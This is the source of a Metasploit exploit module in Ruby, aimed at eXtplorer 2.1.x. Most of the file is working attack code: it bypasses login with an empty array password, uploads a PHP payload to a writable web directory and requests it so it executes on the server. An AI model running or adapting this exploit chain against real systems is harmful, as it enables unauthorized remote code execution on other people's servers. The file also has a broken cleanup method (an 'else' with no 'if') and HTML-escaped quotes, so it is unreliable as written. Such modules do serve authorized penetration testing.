# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "eXtplorer v2.1 Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits an authentication bypass vulnerability in eXtplorer
        versions 2.1.0 to 2.1.2 and 2.1.0RC5 when run as a standalone application.
        This application has an upload feature that allows an authenticated user
        with administrator roles to upload arbitrary files to any writable
        directory in the web root. This module uses an authentication bypass
        vulnerability to upload and execute a file.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Discovery and exploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;88751&#039; ],
          [ &#039;BID&#039;, &#039;57058&#039; ],
          [ &#039;URL&#039;, &#039;http://itsecuritysolutions.org/2012-12-31-eXtplorer-v2.1-authentication-bypass-vulnerability&#039; ],
          [ &#039;URL&#039;, &#039;http://extplorer.net/issues/105&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Dec 31 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/com_extplorer_2.1.0/&#039;]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username for eXtplorer&#039;, &#039;admin&#039;])
      ], self.class)
  end

  def check

    base  = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
    peer  = "#{rhost}:#{rport}"

    # retrieve software version from ./extplorer.xml
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}extplorer.xml"
      })

      if !res or res.code != 200
        return Exploit::CheckCode::Safe
      end

      if res.body =~ /<version>2\.1\.(0RC\d|0|1|2)<\/version>/
        return Exploit::CheckCode::Vulnerable
      end

      if res.body =~ /eXtplorer/
        return Exploit::CheckCode::Safe
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{peer} - Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  def on_new_session(client)
      client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
      client.fs.file.rm("#{@fname}")
    else
      client.shell_command_token("rm #{@fname}")
    end
  end

  def upload(base, dir, fname, file)

    data = Rex::MIME::Message.new
    data.add_part(file, &#039;application/x-httpd-php&#039;, nil, "form-data; name=\"userfile[0]\"; filename=\"#{fname}\"")
    data.add_part("on", nil, nil, "form-data; name=\"overwrite_files\"")
    data.add_part("%2f#{dir}", nil, nil, "form-data; name=\"dir\"")
    data.add_part("com_extplorer", nil, nil, "form-data; name=\"option\"")
    data.add_part("upload", nil, nil, "form-data; name=\"action\"")
    data.add_part("true", nil, nil, "form-data; name=\"confirm\"")

    data_post = data.to_s
    data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{base}index.php",
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    => data_post,
      &#039;cookie&#039;  => datastore[&#039;COOKIE&#039;],
    })

    return res
  end

  def auth_bypass(base, user)

    res   = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => "#{base}index.php",
      &#039;data&#039;   => "option=com_extplorer&action=login&type=extplorer&username=#{user}&password[]=",
      &#039;cookie&#039; => datastore[&#039;COOKIE&#039;],
    })
    return res

  end

  def exploit

    base  = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
    @peer = "#{rhost}:#{rport}"
    @fname= rand_text_alphanumeric(rand(10)+6) + &#039;.php&#039;
    user  = datastore[&#039;USERNAME&#039;]
    datastore[&#039;COOKIE&#039;] = "eXtplorer="+rand_text_alpha_lower(26)+";"

    # bypass auth
    print_status("#{@peer} - Authenticating as user (#{user})")
    res   = auth_bypass(base, user)
    if res and res.code == 200 and res.body =~ /Are you sure you want to delete these/
      print_status("#{@peer} - Authenticated successfully")
    else
      fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
    end

    # search for writable directories
    print_status("#{@peer} - Retrieving writable subdirectories")
    begin
      res = send_request_cgi({
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;uri&#039;     => "#{base}index.php",
        &#039;cookie&#039;  => datastore[&#039;COOKIE&#039;],
        &#039;data&#039;    => "option=com_extplorer&action=getdircontents&dir=#{base}&sendWhat=dirs&node=ext_root",
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end
    if res and res.code == 200 and res.body =~ /\{&#039;text&#039;:&#039;([^&#039;]+)&#039;[^\}]+&#039;is_writable&#039;:true/
      dir = "#{base}#{$1}"
      print_status("#{@peer} - Successfully retrieved writable subdirectory (#{$1})")
    else
      dir = "#{base}"
      print_error("#{@peer} - Could not find a writable subdirectory.")
    end

    # upload PHP payload
    print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes) to #{dir}")
    php = %Q|<?php #{payload.encoded} ?>|
    begin
      res = upload(base, dir, @fname, php)
      if res and res.code == 200 and res.body =~ /&#039;message&#039;:&#039;Upload successful\!&#039;/
        print_good("#{@peer} - File uploaded successfully")
      else
        fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end

    # search directories in the web root for the file
    print_status("#{@peer} - Searching directories for file (#{@fname})")
    begin
      res   = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => "#{base}index.php",
        &#039;data&#039;   => "start=0&limit=10&option=com_extplorer&action=search&dir=#{base}&content=0&subdir=1&searchitem=#{@fname}",
        &#039;cookie&#039; => datastore[&#039;COOKIE&#039;],
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end
    if res and res.code == 200 and res.body =~ /&#039;dir&#039;:&#039;\\\/([^&#039;]+)&#039;/
      dir = $1.gsub(&#039;\\&#039;,&#039;&#039;)
      print_good("#{@peer} - Successfully found file")
    else
      print_error("#{@peer} - Failed to find file")
    end

    # retrieve and execute PHP payload
    print_status("#{@peer} - Executing payload (/#{dir}/#{@fname})")
    begin
      send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "/#{dir}/#{@fname}"
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end
    if res and res.code != 200
      print_error("#{@peer} - Executing payload failed")
    end
  end
end

